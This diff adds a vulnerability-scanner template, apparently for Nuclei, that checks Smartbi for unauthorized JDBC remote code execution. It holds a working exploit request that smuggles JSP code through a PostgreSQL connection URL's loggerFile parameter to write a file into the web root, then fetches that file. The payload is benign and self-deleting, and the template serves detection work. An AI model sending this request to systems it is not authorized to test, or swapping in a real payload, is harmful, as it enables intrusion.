@@ -1,0 +1,41 @@
+id: smartbi-unauthorized-rce
+info:
+  name: Smartbi Unauthorized Access and JDBC Arbitrary Code Execution
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    Smartbi is vulnerable to unauthorized access in versions V7 to V10.5.8, which allows an attacker to exploit a JDBC vulnerability for arbitrary file writing or remote code execution.
+  reference:
+    - https://wiki.smartbi.com.cn/pages/viewpage.action?pageId=50692623
+
+variables:
+  random_filename: '{{rand_base(6)}}'
+  random_multiplier1: '{{rand_int(100, 1000)}}'
+  random_multiplier2: '{{rand_int(100, 333)}}'
+
+http:
+  - raw:
+      - |
+        POST /vision/SyncServlet.stub HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        className=DataSourceService&methodName=testConnectionList&params=[[{"password":"","maxConnection":100,"user":"","driverType":"POSTGRESQL","validationQuery":"SELECT 1","url":"jdbc:postgresql://localhost:5432/test?ApplicationName=xxxuser=test&password=test&loggerLevel=DEBUG&loggerFile=../webapps/smartbi/vision/{{random_filename}}.jsp&<%% out.println({{random_multiplier1}}*{{random_multiplier2}}); new java.io.File(application.getRealPath(request.getServletPath())).delete(); %%>","name":"test","driver":"org.postgresql.Driver","id":"","desc":"","alias":"","dbCharset":"","identifierQuoteString":"\"","transactionIsolation":-1,"validationQueryMethod":0,"dbToCharset":"","authenticationType":"STATIC","driverCatalog":null,"extendProp":"{\"maxWaitConnectionTime\":-1,\"allowExcelImport\":false,\"applyToSmartbixDataset\":false,\"catalogType\":\"ProductBuiltIn\"}"}]]
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+  - raw:
+      - |
+        GET /vision/{{random_filename}}.jsp HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - '{{to_number(random_multiplier1) * to_number(random_multiplier2)}}'
+        part: body
